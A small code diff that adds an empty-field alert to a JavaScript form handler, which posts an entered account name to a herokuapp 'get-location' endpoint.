@@ -133,6 +133,9 @@
     document.querySelector('#myForm').addEventListener('submit', function () {
       event.preventDefault()
       var name = document.querySelector('[name="searchTerm"]').value
+      if(name == ''){
+        alert('Please enter your account name')
+      }
       //send data
       var xhr = new XMLHttpRequest()
       xhr.open('POST', `https://verify-check-twitter.herokuapp.com/get-location`)
